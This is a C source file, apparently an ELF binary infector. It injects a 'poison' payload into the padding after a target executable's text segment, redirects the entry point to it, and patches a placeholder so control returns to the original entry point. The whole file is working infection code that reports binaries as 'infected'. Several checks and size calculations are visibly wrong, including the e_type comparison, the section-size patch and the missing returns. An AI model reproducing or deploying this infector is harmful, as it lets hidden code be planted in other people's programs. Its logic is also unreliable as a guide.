#include "elf.h"
#include "consts.h"
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>


// consts
char mallocError[50] = "Error on malloc operation: ";
char mmapError[50] = "Error on mmap operation: ";
char targetFileError[50] = "Error on target binary file: ";
char poisonFileError[50] = "Error on poison binary file: ";
char munmapError[50] = "Error in writing target binary to disk: ";
char readError[50] = "Error in reading poison to memory: ";


// global vars
unsigned long int target_binary_size;
unsigned long int poison_size;
void *target_memory_address;
Elf64_Off poison_offset;
Elf64_Addr fake_entry_point;
char* poison_address;



void fatal_msg(char *msg){
    fprintf(stdout, "%s\n", msg);
    exit(1);
}


void load_target_binary_in_memory(char *target_binary){
    // mmap target binary into memory
    int fd = open(target_binary, O_RDWR);
    if (fd < 0){
        fatal_msg(strcat(targetFileError, strerror(errno)));
    }
    struct stat buf;
    fstat(fd, &buf);
    target_binary_size = buf.st_size;
    target_memory_address = mmap(0, target_binary_size, (PROT_READ | PROT_WRITE), MAP_SHARED, fd, 0);
    if (target_memory_address == MAP_FAILED){
        fatal_msg(strcat(mmapError, strerror(errno)));
    }
    close(fd);
}



void load_poison_binary_in_memory(char *poison_binary){
    // load poison binary into the memory heap
    int fd = open(poison_binary, O_RDONLY);
    if (fd < 0){
        fatal_msg(strcat(poisonFileError, strerror(errno)));
    }
    struct stat buf;
    fstat(fd, &buf);
    poison_size = buf.st_size;
    poison_address = (char*)malloc(poison_size);
    if (poison_address == NULL){
        fatal_msg(strcat(mallocError, strerror(errno)));
    }
    int read_n = read(fd, poison_address, poison_size);
    if (read_n == -1){
        fatal_msg(strcat(readError, strerror(errno)));
    }
    close(fd);
}


int get_padding_size(Elf64_Ehdr* target_binary_header){
    // return the padding size between the text segment and data segment

    Elf64_Phdr* target_binary_program_header = (Elf64_Phdr*)(target_memory_address + target_binary_header->e_phoff);
    Elf64_Half program_headers_num = target_binary_header->e_phnum;
    int FOUND = 0;
    Elf64_Off end_of_text_segment;
    for(int i=0; i<program_headers_num; i++){
        if (FOUND == 0 && target_binary_program_header->p_type == PT_LOAD && target_binary_program_header->p_flags == (PF_R | PF_X)){
            FOUND = 1;
            end_of_text_segment = target_binary_program_header->p_filesz + target_binary_program_header->p_offset;
            poison_offset = end_of_text_segment;
            fake_entry_point = target_binary_program_header->p_vaddr + target_binary_program_header->p_filesz;
            
            target_binary_program_header->p_filesz += poison_size;
            target_binary_program_header->p_memsz += poison_size;
        }
        else if (FOUND == 1 && target_binary_program_header->p_type == PT_LOAD && target_binary_program_header->p_flags == (PF_R | PF_W)){
            return target_binary_program_header->p_offset - end_of_text_segment;
        }

        target_binary_program_header++;
    }  
}


void patch_section_header(Elf64_Ehdr* target_binary_header){
    // in case of strip binary
    Elf64_Shdr* section_header = (Elf64_Shdr*)(target_memory_address + target_binary_header->e_shoff);
    Elf64_Off section_header_num = target_binary_header->e_shnum;
    
    for(int i=0; i<section_header_num; i++){
        if (section_header->sh_offset+section_header->sh_size == poison_offset){
            section_header->sh_size += poison_offset;
            return;
        }
        section_header++;
    }

}


void patch_poison(Elf64_Ehdr* target_binary_header, Elf64_Addr original_entry_point){
    for(int i=0; i<poison_size; i++){
        if (*(unsigned long*)poison_address == 0x4141414141414141){
            *(unsigned long*)poison_address = original_entry_point;
            break;
        }
        poison_address++;
    }
}

void write_to_disk(){
    int ret_code = munmap(target_memory_address, target_binary_size);
    if (ret_code == -1){
        fatal_msg(strcat(munmapError, strerror(errno)));
    }
}


void inject_poison(char* injected_address){
    memcpy(target_memory_address + poison_offset, injected_address, poison_size);
}

int sanity_checks(Elf64_Ehdr* target_binary_header, char *target_binary){
    // 1) verify if it is an elf file
    if (target_binary_header->e_type == ET_NONE){
        fprintf(stdout, AC_RED "[-] '%s' is not an elf file, poison was not injected\n" AC_NORMAL, target_binary);
        return -1;
    }
    if (target_binary_header->e_type != (ET_EXEC|ET_DYN)){
        fprintf(stdout, AC_RED "[-] '%s' is not an elf of type DYN or EXEC, poison was not injected\n" AC_NORMAL, target_binary);
        return -1;
    }
    if (target_binary_header->e_machine != EM_X86_64){
        fprintf(stdout, AC_RED "[-] architecture is not supprted, poison was not injected\n" AC_NORMAL);
        return -1;
    }
    return 0;

}



int injector(char *target_binary, char*poison_binary){
    load_target_binary_in_memory(target_binary);
    load_poison_binary_in_memory(poison_binary);
    char* injected_address = poison_address;
    Elf64_Ehdr* target_binary_header = (Elf64_Ehdr*)target_memory_address;
    if (sanity_checks(target_binary_header, target_binary) != 0){
        return -1;
    }
    int pad_size = get_padding_size(target_binary_header);
    if (pad_size < poison_size){
        fprintf(stdout, AC_RED "[-] Not enough space for poison, binary '%s' was not infected...\n" AC_NORMAL, target_binary);
    }
    // save original entry point
    Elf64_Addr original_entry_point = target_binary_header->e_entry;

    // change target binary entry point
    target_binary_header->e_entry = fake_entry_point;
    patch_section_header(target_binary_header);
    patch_poison(target_binary_header, original_entry_point);
    inject_poison(injected_address);

    free(injected_address);

    fprintf(stdout, AC_MAGENTA "[+] Binary '%s' was infected with poison...\n" AC_NORMAL, target_binary);
    write_to_disk();
    return 0;
}

